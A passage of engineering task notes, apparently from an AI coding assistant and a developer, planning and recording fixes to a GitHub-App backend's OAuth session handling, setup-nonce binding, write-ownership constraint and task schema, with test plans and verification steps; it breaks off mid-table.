| 3 | `GET /api/repositories` lists the chosen repos, all `managed: false` | §4.2 — installation access ≠ ForgeStack maintenance |
| 4 | `POST /api/repositories/{id}/manage` flips exactly one | Opt-in is per repository |
| 5 | Change selection on GitHub → `POST /api/repositories/sync/{installationId}` | Resync reflects GitHub, not cached state |
| 6 | Remove a *managed* repo's access → status `ACCESS_LOST` | §7 lifecycle: silent failure here is the worst outcome |
| 7 | Replay the callback URL from history | Nonce is single-use |
| 8 | Hand-edit `installation_id` to another number | **The anti-hijack check.** Expect 403 + an `INSTALLATION_BIND_REJECTED` row in `audit_events` |
| 9 | Grep the boot log for the PEM body and OAuth secret | No credential reaches the log sink |
| 10 | Restart with a wrong `FORGESTACK_GITHUB_APP_ID`, replay the callback | **The §1.1 fix** — expect a 500 naming the credentials, not a 403. The only item `FakeGithub` cannot cover |

Items 8 and 10 are the two that justify the exercise. Everything else confirms the happy path; those
two confirm the guarantees, and per the standing rule a guarantee nobody has watched hold is one
nobody knows works.

Item 10 is last because it needs a restart with a deliberately broken `.env`, and item 6 is
second-to-last because it revokes access the earlier items depend on.

## Expected outcome

No code changes are anticipated. Anything this turns up gets a `known-gaps.md` entry and its own
fix commit, kept separate from the checklist run — the same discipline that kept the rename
reviewable. Checked boxes land in `docs/known-gaps.md` §7 in one commit at the end.

## Verification

`./gradlew test` still **67**. This task adds no tests: it exercises paths that are already covered
against `FakeGithub`, against the thing `FakeGithub` imitates.

---

# Task D — the OAuth servlet session shadows the ForgeStack session

**Status: implemented and committed (`6234e78`), 74 tests green.** Six of seven new tests were
watched failing first, three reproducing the browser's exact NPE. The token-retention finding was
corrected during implementation — the token was in Boot's autoconfigured
`InMemoryOAuth2AuthorizedClientService`, not the servlet session, so the first-guess assertion would
have passed without the fix. Written up as `known-gaps.md` §1.8 / §1.8b.

## Context

The first real browser login worked. The database proves it: one `users` row
(`QL-Tushar-Kumar`, `provider_user_id 213618763`), one `user_identities` row, and one `sessions`
row **with a non-null `workspace_id`** — which incidentally confirms the Task #15 prerequisite fix.

Sixteen seconds later, `GET /api/installations/start` returned a Spring Boot Whitelabel error page.
The log says why:

```
java.lang.NullPointerException: Cannot invoke
  "dev.tushar.forgestack.githublogin.ForgeStackPrincipal.sessionId()" because "principal" is null
```

**This is not a setup mistake. Every authenticated endpoint is unreachable from a browser** — all
seven, across `SessionController`, `InstallationController` and `RepositoryController`, which each
take `@AuthenticationPrincipal ForgeStackPrincipal`.

*(The Whitelabel page seen after step 1 was different and harmless: `login-success-redirect`
defaults to `/`, nothing maps `/`, so a successful login lands on a 404. Cosmetic until a frontend
exists.)*

### Root cause

Two authentication mechanisms are live at once, and the wrong one wins:

1. `SecurityContextHolderFilter` sits at **position 3** of the chain — verified against the Spring
   Security reference, and well before `ForgeStackSessionAuthenticationFilter`, which is registered
   `addFilterBefore(..., UsernamePasswordAuthenticationFilter.class)` at ~9. It restores the
   `OAuth2AuthenticationToken` that `oauth2Login` persisted into the servlet session.
2. `ForgeStackSessionAuthenticationFilter:38` guards on
   `SecurityContextHolder.getContext().getAuthentication() == null`. It is never null, so the filter
   **never reads the ForgeStack cookie**.
3. `authorizeHttpRequests` sees an authenticated request and admits it.
4. `AuthenticationPrincipalArgumentResolver` finds an `OAuth2User` where a `ForgeStackPrincipal` is
   declared. Per the Spring Security API docs, a type mismatch **returns null silently** unless
   `errorOnInvalidType` is set. Hence the NPE.

`SecurityConfig:58-60` already states the intent this code fails to implement:

> *The API is authenticated by the ForgeStack session cookie, not by a servlet session.*

The invariant that should hold and currently does not: **on `/api/**`, authenticated ⟺
`ForgeStackPrincipal`.** Every controller assumes those cannot diverge.

### Second finding — the GitHub user token is retained, but not where it looked

**Corrected after checking Boot 4.1's actual autoconfiguration.** The first guess was the servlet
session; it is wrong, and acting on it would have produced a test that passes vacuously.

`spring-boot-security-oauth2-client-4.1.0.jar` — on the classpath via
`spring-boot-starter-security-oauth2-client` — ships both
`OAuth2ClientConfigurations$OAuth2AuthorizedClientServiceConfiguration` and
`OAuth2ClientWebSecurityAutoConfiguration` (verified by listing the jar). Together they register an
`InMemoryOAuth2AuthorizedClientService` and an `AuthenticatedPrincipalOAuth2AuthorizedClientRepository`
over it. That repository routes to the **service** — not the session — whenever the principal is
authenticated, which it is when `OAuth2LoginAuthenticationFilter` calls `saveAuthorizedClient`.

So every GitHub user access token ForgeStack has issued is in a `ConcurrentHashMap` on the heap,
keyed by GitHub login, for the process lifetime. Nothing evicts it: the logout handler
(`SecurityConfig:54-57`) revokes the ForgeStack session and clears the cookie but never calls
`removeAuthorizedClient`.

Two consequences:

- §6's *"No GitHub user token is persisted"* is false as stated, and so is the
  `ForgeStackOAuth2UserService` class javadoc (*"used only to fetch the profile and is then
  discarded — it is never persisted"*). Both are true of **our** code and false of the framework's.
  Not configuring something is a decision, and this one was never made.
- Blast radius is bounded — the scopes really are only `read:user`/`user:email`
  (`GithubOAuthScopeTest` guards that), so a leaked token reads a profile and cannot touch code.
  Worth fixing, not worth alarm. Note GitHub issues no refresh token unless token expiration is
  enabled, which `local-setup.md` leaves optional, so assume access token only.

The assertion this implies is **not** "nothing in the servlet session" but
`OAuth2AuthorizedClientService.loadAuthorizedClient("github", login)` returning null — where the
principal name is the `login` attribute, per `ForgeStackOAuth2UserService:59`
(`new DefaultOAuth2User(authorities, enriched, "login")`).

### Why no test caught it

**Nothing in `src/test` authenticates a request.** `GithubOAuthScopeTest` inspects configured scopes
and is the only file under `githublogin/`; there are no tests under `api/`. This is the
`known-gaps.md` entry already ranked highest-value — *"no test boots the packaged application"* —
producing its fourth finding.

## Change — one commit

**1. Stop persisting the OAuth2 authentication** (`githublogin/internal/SecurityConfig.java`)

Add `.securityContext(sc -> sc.securityContextRepository(new NullSecurityContextRepository()))`.
Keep `SessionCreationPolicy.IF_REQUIRED`: the handshake still needs a session for the authorization
request, which `HttpSessionOAuth2AuthorizationRequestRepository` holds under a *different* attribute
and is unaffected. `STATELESS` would break the handshake — the existing comment says so and is right.

**2. Stop retaining the GitHub token** (same file, plus one small class)

New package-private `githublogin/internal/DiscardedGithubUserTokens.java` implementing
`OAuth2AuthorizedClientRepository` with three no-ops (`@Nullable` on the load return, matching the
project's existing jspecify usage). There is no built-in null implementation. Wire it in the DSL:

```java
.oauth2Login(oauth2 -> oauth2.userInfoEndpoint(userInfo -> userInfo.userService(oauth2UserService))
        .authorizedClientRepository(new DiscardedGithubUserTokens())
        .successHandler(issueForgeSession()))
```

`OAuth2LoginConfigurer.authorizedClientRepository` sets the shared object, so it beats Boot's
autoconfigured repository without touching autoconfiguration. Preferred over a `@Bean` override
because it sits where a reviewer of the login flow will actually look — beside `userInfoEndpoint`
and `successHandler`. Prevents the write rather than cleaning up after it, and makes §6 true.

**3. Delete the guard** (`githublogin/internal/ForgeStackSessionAuthenticationFilter.java`)

**Revised.** The earlier wording — change the guard to "not already a `ForgeStackPrincipal`" and
clear foreign authentication on `/api/**` — was wrong twice over.

*Wrong to keep any guard:* with step 1 in place nothing populates the context before this filter
(`AnonymousAuthenticationFilter` runs after it), so there is nothing to defer to. Simply delete the
`if (...getAuthentication() == null)` branch. That removes the exact line the NPE traces back to,
and with it the silently-do-nothing failure mode.

*Wrong to put path logic here:* "on `/api/**` only" is an authorization concern, and an
authentication filter that knows about URL patterns is the second copy of a rule that already has a
home. It goes in step 4 instead.

*Also rejected: making the cookie merely take **precedence**.* That leaves the OAuth2 session as a
fallback authenticator whenever the cookie is absent, expired, or revoked — which would quietly
break the promise in this filter's own javadoc that revocation "takes effect on the next request".
A browser holding `JSESSIONID` would stay logged in after `SessionService.revoke`.

Safe with respect to the callback either way: `AbstractAuthenticationProcessingFilter` does not
continue the chain after a successful authentication, so this filter never runs on
`/login/oauth2/code/github`.

**4. Require a ForgeStack principal at the authorization layer** (`SecurityConfig`)

Replace `.requestMatchers("/api/**").authenticated()` with `.access(forgeStackPrincipalRequired())`
— a private static `AuthorizationManager<RequestAuthorizationContext>` helper in the same class, in
the style of the existing `issueForgeSession()`. `authenticated()` is precisely the predicate that
an `OAuth2AuthenticationToken` satisfied on its way to a null principal; this states what the seven
endpoints actually need.

Steps 1 and 4 overlap deliberately. 1 removes today's cause; 4 makes the invariant
**authenticated ⟺ `ForgeStackPrincipal`** hold at the gate even if something later repopulates the
context — turning a future recurrence into a 403 instead of a 500 in seven places at once.

Preserves the behaviour documented in §1.5: an anonymous caller still yields a false decision, so
`ExceptionTranslationFilter` still calls the entry point and `/api/session` still 302s to
`/oauth2/authorization/github`.

**Not doing:** null checks in the seven controllers, or `errorOnInvalidType = true` on each
`@AuthenticationPrincipal`. With step 4 in place a null principal is unreachable, and seven
defensive copies of one rule is the noise Appendix A argues against.

## Test — extend `FakeGithub` to cover the login handshake

Chosen scope: **the full flow**, because the fast variant stubs past the handshake that broke.

`support/FakeGithub.java` currently serves only `/app/installations` and
`/installation/repositories`. Add GitHub's OAuth endpoints — the access-token exchange and `/user`
(plus `/user/emails`, per the `user:email` scope) — and point the provider at them in the test
context via `spring.security.oauth2.client.provider.github.token-uri` and `user-info-uri`.
`AbstractIntegrationTest` already has the `@DynamicPropertySource` hook.

Mechanism: **MockMvc with one `MockHttpSession` passed to every request** — a faithful stand-in for
a browser holding `JSESSIONID`, and explicit about the session surviving between requests, which is
the whole bug. A `RANDOM_PORT` test with a real cookie jar has higher fidelity but needs hand-rolled
cookie handling and a third `webEnvironment`, and buys nothing: the defect is entirely inside the
servlet filter chain, which MockMvc runs for real.

Put `@AutoConfigureMockMvc` and the two provider overrides on **`AbstractIntegrationTest`**, not the
new class: it holds the test-context count at two (`AbstractGithubAppTest`'s javadoc is explicit
about not wanting silent context proliferation) and makes "no test can reach github.com" a property
of the base class rather than of each test remembering.

Overriding only `token-uri` and `user-info-uri` is deliberate — `OAuth2ClientPropertiesMapper`
starts from `CommonOAuth2Provider.GITHUB` and overlays, so `user-name-attribute: id`, the
authorization URI and `CLIENT_SECRET_BASIC` all survive.

The authorization endpoint is never called: the test reads `state` out of the `Location` header of
`GET /oauth2/authorization/github` and calls the redirect URI itself.

New test, `githublogin/LoginSessionIntegrationTest`, driving the real chain:

| # | Assertion | Now | After | Pins |
|---|---|---|---|---|
| 1 | Callback issues a `forge_session` cookie | passes | passes | the handshake still works |
| 2 | `GET /api/session` with session **and** cookie → 200, non-null `activeWorkspaceId` | **500** | 200 | the regression itself |
| 3 | `GET /api/session` with session, **no** cookie → 302 | **500** | 302 | a servlet session is not a credential |
| 4 | `revoke()`, then request with both → 302 | **500** | 302 | revocation immediacy, which the shadowing silently defeated |
| 5 | `authorizedClientService.loadAuthorizedClient("github", login)` is null | **fails** | passes | §6's token claim |
| 6 | `get("/api/session").with(oauth2Login())` → **403** | **500** | 403 | step 4's gate, and *only* that |

**Two traps this table encodes, both found by checking rather than assuming:**

- **Row 5 is not "nothing in the servlet session".** The token is in an in-memory
  `OAuth2AuthorizedClientService`, not the session, so the session-shaped assertion would pass
  without the fix and prove nothing.
- **Row 6 cannot be made green by step 1.**
  `SecurityMockMvcRequestPostProcessors.oauth2Login()` wraps the repository in a
  `TestSecurityContextRepository` that prefers a request attribute over the delegate, so the token
  reaches the holder even with `NullSecurityContextRepository` installed. That makes it a good test
  of the step-4 gate and a useless test of step 1 — so rows 2–4 must **not** be built on it.

**Watch rows 2–6 fail first**, per the `watch-guarantees-fail-first` memory. Land `FakeGithub`, the
base-class change and the test class on the *unfixed* code, run, and record the actual failure text
rather than predicting it — in particular whether MockMvc rethrows the NPE or renders a 500, since
MockMvc performs no ERROR dispatch and may present the same defect differently from the browser.
Only then apply the fix.

## Files

| File | Change |
|---|---|
| `githublogin/internal/SecurityConfig.java` | steps 1, 2, 4; rewrite the comment at 58-60 to name `HttpSessionOAuth2AuthorizationRequestRepository` as why `IF_REQUIRED` survives |
| `githublogin/internal/DiscardedGithubUserTokens.java` | **new**, package-private, three no-ops |
| `githublogin/internal/ForgeStackSessionAuthenticationFilter.java` | delete the guard at :38, add the *why* comment |
| `githublogin/internal/ForgeStackOAuth2UserService.java` | amend the javadoc — the claim was true of this class and false of the running system |
| `support/FakeGithub.java` | add `/login/oauth/access_token`, `/user`, `/user/emails` + a `githubUser(...)` helper mirroring `installation(...)` |
| `support/AbstractIntegrationTest.java` | `@AutoConfigureMockMvc` + the two provider overrides |
| `githublogin/LoginSessionIntegrationTest.java` | **new**, rows 1-6 |
| `docs/known-gaps.md` | below |

Nothing under `api/` changes. All seven endpoints are fixed by the filter chain.

## Verification

- `./gradlew test` — **67 → 73**, all green. Every pre-existing test must be untouched; this is a
  security-chain change, and movement elsewhere means the chain shifted more than intended.
- Manual, the real proof: log in via browser, then `GET /api/session` returns 200 with a non-null
  `activeWorkspaceId` instead of a Whitelabel page. **That unblocks Task C**, which then runs
  unchanged.
- After login, assert the authorized-client service is empty and grep the log for the access token.

## Then update `docs/known-gaps.md`

New **§1.8** recording the shadowing bug and the §6 token-retention correction, quoting the observed
first-run failures the way §1.1 quotes `"Expecting code to raise a throwable"`.

Entries that stay **open**:

- **The category lesson, beside §1.2b.** This bug is invisible to `curl`: it needs a client holding
  `JSESSIONID` *and* `forge_session` at once. The entire §7 checklist is curl-shaped and would have
  passed end to end. *Anything that only manifests when the client keeps state is invisible to a
  stateless check* belongs next to *anything the suite does not touch is unverified*.
- **§1.5, vindicated.** That entry already warns this file records beliefs, after one was written
  from reading config instead of running it. `SecurityConfig:58-60` was the same mistake in
  production code: a comment describing intent is a belief, not an enforcement. Second instance in
  the same file's blast radius.
- **§5, carefully.** "No HTTP-layer tests" is now *partly* closed — one class covers login→API — but
  the other six endpoints have no status-code or JSON coverage, and **"no test boots the packaged
  application" stays fully open**: MockMvc overrides configuration and never starts the packaged
  app. Say so, so nobody reads this task as having closed the table's top entry.
- **New:** `ForgeStackSessionAuthenticationFilter` is a `@Component` implementing `Filter`, so Boot
  registers it as a container-level servlet filter *in addition* to its place in the security chain.
  Benign only because the chain has precedence `-100` and `OncePerRequestFilter` suppresses the
  second call — but it is the same shape as the bug just fixed: a second copy of an authentication
  mechanism running outside the chain. Fix is a `FilterRegistrationBean` with `setEnabled(false)`,
  or dropping `@Component` and constructing it in `SecurityConfig`. **Recorded, not folded in**, to
  keep this diff reviewable.

## Two defaults I chose without you

`AskUserQuestion` failed twice with a stream error, so these are taken as the recommended options —
say the word at approval and either flips:

1. **Scope: all four steps**, rather than the core fix alone. The token retention and the missing
   gate are both one-line-ish given the file is already open, and both are things this task
   *discovered*; deferring them means re-deriving the context later.
2. **Sequencing: tests first**, watched failing, before the fix. This delays your App install by the
   time it takes to build the `FakeGithub` OAuth endpoints. The argument for paying it: this bug is
   invisible to every check we currently run, so without the test nothing would catch a recurrence —
   and it is the fourth finding from running rather than testing the app.

---

# Task E — the setup nonce is too brittle, and its failure is unreadable

## Context

With Task D in, the install flow ran for real: `/api/installations/start` redirected to GitHub, the
App was installed, and GitHub returned the browser to the Setup URL. **The Setup URL is correct and
the App is installed** — `GET /app/installations` now reports one installation:

```
id=153999617  account=QL-Tushar-Kumar  type=User  accountId=213618763  selection=all
```

`accountId` matches `user_identities.provider_user_id` exactly, so the anti-hijack ownership check
would have passed. The binding still failed, and the browser showed *"This page is not working"*:

```
WARN  InstallationBindingService : Rejected GitHub installation binding:
      installation=153999617 reason=INVALID_SETUP_STATE
```

### Two defects, one of which hid the other

**1. The nonce is bound to a session id, and sessions churn.** `InstallationSetupNonces.issue`
stores `sessionId` and `completeSetup` requires the callback to arrive on that same session. The
`sessions` table shows three logins inside ten minutes — `bac56f25` (13:40, last used **18:33:26**,
the callback), `75f64547` (**18:25:30**), `6a7e9cbf` (18:35:48) — so the flow straddled two of them.
The GitHub install screen takes minutes, and the docs actively send a first-time user off to check
their Setup URL mid-flow, so re-authenticating inside the window is ordinary, not exotic.

**2. `INVALID_SETUP_STATE` cannot be diagnosed, and its own javadoc says so:** *"No such nonce,
already used, expired, or issued to a different session."* Four causes, one enum value, one WARN
line, one audit row. This is exactly the §1.1 pattern — a 401 and a 404 collapsed into one
indistinguishable outcome — recurring in a different module.

That second defect is why the root cause here is still **undetermined**. The browser holds exactly
one `forge_session` cookie (checked), which should make a session mismatch impossible; yet
`last_seen_at` proves session A served the callback while session B was current. Either the nonce
had simply expired past its 15-minute TTL, or something authenticated as an older session. **The
system did not record enough to tell**, and no amount of further inspection now will recover it. The
fix is to make the next occurrence self-explanatory rather than to keep guessing at this one.

**3. The callback returns an empty body.** `InstallationController.callback` answers every rejection
with `ResponseEntity.status(...).build()`. GitHub redirects a *real browser* here, so a bare 400
renders as Chrome's "This page is not working" — the user is told nothing at all. The javadoc's
"acceptable while there is no browser client" is no longer true: this endpoint's only caller *is* a
browser.

## Change

**1. Bind the nonce to the user, not the session** (`githubinstallation/internal/installation/InstallationSetupNonces.java`,
`InstallationBindingService.completeSetup`)

Store `userId`; compare against the caller's `userId`. Decided with the user.

The nonce's job, per its own javadoc, is that "a third party cannot cause someone else's browser to
complete an install flow it never began". User granularity satisfies that exactly — an attacker
cannot mint a nonce for someone else's account without being logged in as them. *Same human,
different session* was never the threat. The ownership check against the GitHub account id is
untouched and still independently blocks id substitution, which is the attack the nonce was never
able to stop anyway.

Single use stays. `InstallationController.start` passes `principal.userId()` instead of
`principal.sessionId()`.

**2. Raise the TTL to 30 minutes.** Fifteen assumes the user goes straight to GitHub and back. The
real flow includes reading GitHub's permission screen and picking repositories, and `local-setup.md`
tells a first-timer to verify their Setup URL on the way. The nonce is single-use and now
user-bound; a leaked link that goes stale in 30 minutes rather than 15 is not a meaningfully
different exposure.

**3. Split the rejection reason so the server can tell what happened**
(`InstallationBindingResult.Reason`, `InstallationSetupNonces.consume`)

`consume` returns enough to distinguish *absent* from *foreign*. Two reasons replace one:

| Reason | Means | Caller sees |
|---|---|---|
| `SETUP_STATE_EXPIRED` | no such nonce — expired, already used, or never issued | 400, **explained** |
| `SETUP_STATE_FOREIGN` | a live nonce belonging to another user | 400, explained the same way |

Both render identically to the caller and are distinct in the log and the `audit_events` row. Unlike
§1.1's 403/404 pair there is no oracle concern in telling a user their *own* setup link expired, so
the message can be genuinely helpful; a foreign nonce is the one worth alerting on, and it is now
greppable.

**4. Give the callback a body** (`api/installation/InstallationController.java`)

A rejection returns a short `text/plain` explanation and what to do — "This setup link has expired.
Start again from /api/installations/start." Still the same status codes. The ownership rejections
(`UNKNOWN_INSTALLATION`, `NOT_YOUR_ACCOUNT`) keep a single shared wording, because §7 requires them
to stay indistinguishable.

## Not doing

- **`ForgeStackSessionCookie.read` uses `findFirst()`** on the cookie list, so duplicate
  `forge_session` cookies would be resolved arbitrarily. It was the leading theory until the cookie
  count came back as 1. No evidence it is real → `known-gaps.md` entry, not speculative code.
- **The nonce is still consumed before the ownership check**, so a rejection burns it. Single use is
  the security property; with a readable error the user now knows to restart.

## Test

Extend `githubinstallation/InstallationBindingServiceTest` (which already covers nonce reuse,
foreign nonce, and absent nonce against the session-bound behaviour — those assertions move to the
user-bound equivalent):

| Assertion | Pins |
|---|---|
| A nonce issued in one session completes in **another session of the same user** | the actual regression — this is the flow that just failed |
| A nonce issued to a **different user** is rejected as `SETUP_STATE_FOREIGN` | CSRF protection survives the loosening |
| A consumed nonce is rejected as `SETUP_STATE_EXPIRED` | single use |
| An absent nonce is `SETUP_STATE_EXPIRED`, not `SETUP_STATE_FOREIGN` | the two are actually distinguished |

The first must be **watched failing** before the change — it is the one that reproduces the user's
failure, and per the standing rule a fix for a path never seen failing proves nothing.

## Verification

- `./gradlew test` — **74 → ~77**, green, with `LoginSessionIntegrationTest` untouched.
- Manual, the real proof and the thing that unblocks Task C: visit
  `http://localhost:8080/api/installations/start`. GitHub shows the configure page for the existing
  installation `153999617`; approving returns to the callback with `setup_action=update`, which
  `InstallationController` already handles identically to `install`. Expect a redirect, a
  `github_installations` row, and an `INSTALLATION_BOUND` audit row.
- Deliberately break it once: replay the same callback URL and confirm a readable
  `SETUP_STATE_EXPIRED` page rather than "This page is not working".

Then `known-gaps.md`: §1.9 for this, plus the `findFirst()` entry under §2, and tick the §7 items
this run covers.

## Progress and two late findings

**Implementation is ~90% done and uncommitted**, sitting on `6234e78`. Done: nonce bound to
`userId`, TTL 30 min, `Reason` split into `SETUP_STATE_EXPIRED` / `SETUP_STATE_FOREIGN`, controller
returns a `text/plain` body, `beginSetup`/`completeSetup` shed the now-dead `sessionId` parameter,
plus `support/BrowserLogin` extracted so `LoginSessionIntegrationTest` and the new
`InstallationSetupFlowTest` share one OAuth handshake.

Both new tests were **watched failing** on the unfixed code, with the user's exact symptoms:

```
an install survives the user logging in again ...  expected: 302 but was: 400
a rejection explains itself ...                    Expecting not blank but was: ""
a nonce from a different user is refused           PASS   (already strict enough)
```

Remaining: re-run the suite (last compile error in `RepositoryCatalogTest` is fixed but unverified),
then `known-gaps.md`, then commit.

### Finding: there is a second GitHub account in play

The user logged in with a different GitHub account to test. This is not a red herring — it changes
the guidance and slightly changes the fix.

Installation `153999617` belongs to **`QL-Tushar-Kumar`** (`accountId 213618763`). The ownership
check compares that against `user_identities.provider_user_id` of the *signed-in ForgeStack user*.
So finishing the flow signed in as the other account is refused with `NOT_YOUR_ACCOUNT` — correctly,
and it is the same rejection an attacker would get.

Binding the nonce to the user does **not** paper over this, and must not: switching accounts
mid-flow is genuinely a different human as far as the check is concerned. What it does mean is that
the rejection wording has to help, because "wrong GitHub account" and "expired link" are now both
live possibilities for this user and both currently render as the same blank page.

**Refinement to the messages** in `InstallationController.explain`: mention the account, without
becoming the oracle §7 forbids. `NOT_YOUR_ACCOUNT` and `UNKNOWN_INSTALLATION` keep one shared
wording that says to check which GitHub account is signed in — that reveals nothing about whether
the installation exists. The setup-state pair likewise mentions that switching accounts invalidates
a link.

### Finding: a successful login looks like a failure

Reported three times now as "redirected to whitelabel". It is not an error:
`forgestack.security.login-success-redirect` defaults to `/`, nothing maps `/`, so **every
successful login lands on Spring's Whitelabel 404.** The one signal the user gets from a working
login is indistinguishable from a broken one.

**Change the default to `/api/session`** (decided with the user). `SecurityConfig` reads it via
`@Value("${forgestack.security.login-success-redirect:/}")`; only the default moves. After logging
in the browser lands on its own session JSON — confirmation that it worked, plus *which account is
signed in*, which is exactly the thing needed before starting an install. Update the §5 table in
`docs/local-setup.md`, which documents the default as `/`.

### Environment note

Postgres, Redis and the app are all stopped (reboot). The `forge-backend_forgestack-pgdata` volume
survived, so the existing user, sessions and audit rows come back with `docker compose up -d`. The
GitHub-side installation is untouched and still present.

## Revised verification

1. `./gradlew test` — expect **74 → 78** green (three new flow tests, one new nonce test).
2. `docker compose up -d && ./scripts/dev.sh`.
3. Sign in **as `QL-Tushar-Kumar`** — the account that owns installation `153999617`. Landing on
   `/api/session` should now show a non-null `activeWorkspaceId`; confirm `email`/`displayName` are
   that account and not the other one.
4. `/api/installations/start` → GitHub shows the configure page for the existing installation →
   approve → expect a redirect and a `github_installations` row, not a blank page.
5. Deliberately break it once: replay the callback URL and confirm a readable expired-link message.






# Task F — one write owner per real repository

**Status: implemented.** `V5__single_write_owner.sql`, `WriteOwnershipTest` (4 tests). Full suite
80 → 84 green.

## Context

Asked whether Forge should move to "one repository → one workspace with WRITE authority, plus
explicitly authorized READ/OBSERVE workspaces". Decided **yes**, and adopted only the write half
now. Observation is designed but deliberately unbuilt.

Three findings shaped that split.

**The write case is stronger than coordination difficulty.** `github_action_log` is unique on
`(workspace_id, fingerprint)` and is the ledger that stops a crash between "GitHub committed" and
"we recorded it" from opening duplicate pull requests. A second writing workspace gets a *second*
ledger, and neither can see the other's fingerprints — so the guarantee does not degrade, it stops
applying, silently. That is a property already built and paid for, voided by a second writer.

**The motivating case for observation does not need observation.** "Agent B reads `auth-service` to
modify `payment-service`" is, in the common shape, two repositories on one account — same
installation, same workspace — and is already solvable with two narrow tokens,
`TokenScope.readOnly(...)` plus `TokenScope.contribute(...)`. Cross-workspace observation is only
required once workspaces are deliberately split, which needs a shared-installation model that does
not exist. Observation is therefore *downstream* of installation sharing, not an independent
feature, and is unreachable today even if built.

**Observation would open the first cross-tenant credential path.** Minting for repository X requires
the installation that exposes X, which belongs to the owning workspace. Today no code can express
one workspace reaching another's credentials, and that absence is a real safety property. Worth
opening once, against a live requirement — not speculatively.

## Change

`managed_repositories` keyed maintenance on `github_repository_id`, a workspace-local UUID. Since
V4 two workspaces hold *different* UUIDs for the same real repository, so a constraint there cannot
see a cross-workspace collision. V5 adds `github_repo_id` and the invariant:

```sql
CREATE UNIQUE INDEX managed_repositories_single_writer
    ON managed_repositories (github_repo_id)
    WHERE status = 'ACTIVE';
```

Partial on `ACTIVE` deliberately: `PAUSED` and `ACCESS_LOST` release the claim, so a workspace that
stopped maintaining a repository does not hold a global lock nobody else can see or appeal. The cost
is that re-enabling can now fail because someone else claimed it — the correct visible outcome
rather than two writers. `ManagedRepositoryService.enable` translates the constraint violation into
`Optional.empty()`, matching how `InstallationBindingService` handles `installation_id`; the
controller already renders that as 404 rather than 403 so as not to confirm the repository exists.

**The migration has an RLS trap worth remembering.** `FORCE ROW LEVEL SECURITY` applies to the table
owner, and migrations run as `forgestack_migrator` — the owner. With no `app.workspace_id` bound,
both tables read as *empty*, so the backfill would quietly update nothing. Verified directly: the
same count returns 0 with FORCE and 9 without. V5 lifts FORCE for the backfill and restores it
immediately; Postgres DDL is transactional and Flyway runs each migration in one transaction, so a
failure between those points rolls back the lift too.

## Deliberately not done

- `TokenScope` does **not** gain a `workspaceId`. It is unreachable today — no code path shares an
  installation — so the field would be carried, hashed, and never exercised, which is the same
  vacuity this project already flags in two ArchUnit rules. Guarded instead by the tripwire below.
- No observer grant table, no read-only observer path, no cross-tenant minting.
- No `repository_ownership` aggregate. The partial index expresses the invariant without inventing
  one; promote it when transfer semantics need their own history.
- Installation binding stays 1:1 for alpha.

## Test

`WriteOwnershipTest`. The setup builds a state GitHub cannot produce — two installations, two
accounts, one repository — because that is precisely the state the constraint defends and it is
otherwise unreachable. Watched failing first with the index commented out: the second workspace
successfully obtained an `ACTIVE` claim on the same repository, twice over.

The fourth test is a **tripwire**, not a behaviour test: it asserts `installation_id` is still
uniquely constrained, and its failure message lists what must change alongside it — `TokenScope`'s
fingerprint, `available()`'s tenancy assumption, and keying repository concurrency on
`github_repo_id`. Dropping that constraint should hand the next engineer a checklist, not a green
build.

One flaw found while writing it: counting active writers with a single unscoped query always
returned 0, because the app role is subject to RLS and holds no `BYPASSRLS`. Counting inside each
tenant scope and summing is the honest form, and demonstrates the property that makes the constraint
necessary — neither workspace can see the other's claim, so only the database can arbitrate.

## Decided for Phase 2, nothing to change yet

Repository concurrency must be keyed on **`github_repo_id`**, never on a `ManagedRepository` or
`GithubRepository` UUID. Free to decide now because no locking code exists — not a lease, not a
semaphore, not a stub. In a 1:1 world the two choices are indistinguishable, which is exactly why
Phase 2 would otherwise pick the workspace-local one and be silently wrong once installations are
shared.


# Phase 2 — step 2.2: the task/attempt/step schema

**Status: implemented.** `V7__task_model.sql`, `TaskModelSchemaTest` (7 tests). Suite 90 → 97 green.

## Ordering — 2.2 before 2.1, deliberately

The Phase 2 table lists `platform.jobs` (2.1) before the task schema (2.2). That order does not
work. 2.1's exit criterion is *"`FLUSHALL` on Redis loses no work"*, and the durable copy the
reconciler rebuilds from is `tasks.lease_owner / lease_epoch / lease_expires_at` — columns defined
in 2.2. §5 says so directly: "`tasks.lease_expires_at` is the durable copy; reconciler reclaims".
So the schema comes first, and 2.1 follows against something real rather than a toy job type.

Noted rather than silently reordered, because the numbering is referenced elsewhere.

## What landed

`tasks`, `task_state_transitions`, `task_attempts`, `task_steps` — with RLS forced on all four, the
scheduler and reconciler indexes from §4.4, and `task_state_transitions` revoked to append-only on
the same terms as `audit_events`.

**The exit criterion is `one_live_attempt_per_task`**, a partial unique index on
`task_attempts(task_id) WHERE ended_at IS NULL`. Watched failing first with the index commented
out: eight concurrent racers all opened an attempt, leaving eight live attempts on one task. That is
the whole argument for the constraint — each racer read "no live attempt" and each was individually
correct, and no check before the write closes that window.

Three constraints beyond the plan's sketch, each guarding a shape that would quietly break something
above it:

- `task_attempts_ended_ck` — `(outcome IS NULL) = (ended_at IS NULL)`. A half-ended row releases the
  single-writer slot while the attempt is still running.
- `tasks_terminal_reason_ck` — only terminal states may carry a `terminal_reason`. `ABANDONED` and
  `FAILED` mean different things operationally and both must say which.
- `tasks_state_ck` — the twelve FSM states and no others, so `BLOCKED` cannot creep back in and
  `RESUMED` cannot be mistaken for a state.

## Deferred, with reasons

- **`tool_calls`, `tool_results`, `evidence`, `plans`, `llm_invocations`, `human_interventions`.**
  All of §4.4, none of it reachable until there is a runtime to write it. Arrives with the phase
  that first needs it rather than as a speculative empty schema.
- **Partitioning `task_steps`.** Against the plan's advice to set it up front. There are zero rows
  and no observed access pattern, and partitioning now means carrying `created_at` through every
  primary key. The cost the plan warns about is retrofitting onto a *large live* table; the trigger
  is therefore volume, and V6's create-and-lock-down function is the pattern to reuse.

## Next

2.1 `platform.jobs` — outbox relay, Redis Streams queue, fenced leases, reconciler. Needs
`spring-modulith-starter-jpa` added: only `-core` is on the classpath today, so the
`event_publication` registry the plan relies on as the transactional outbox is not present.

# Phase 2 — step 2.1: the queue, the outbox, and taking work back

**Status: implemented.** `V8__event_publication.sql`, `V9__reconciler_backoff.sql`, `platform.jobs`
(7 files), `task` (3 files), 23 tests. Suite 97 → 120 green. Verified live against the running app,
not only Testcontainers.

## Exit criteria, and what holds them up

> *A trivial job survives `kill -9` and resumes; `FLUSHALL` on Redis loses no work.*

Both are the same claim from two directions — Postgres is the only source of truth and Redis is a
transport that may vanish at any moment — and both are asserted in `CrashRecoveryTest`.

| Criterion | Test | Watched failing first by |
|---|---|---|
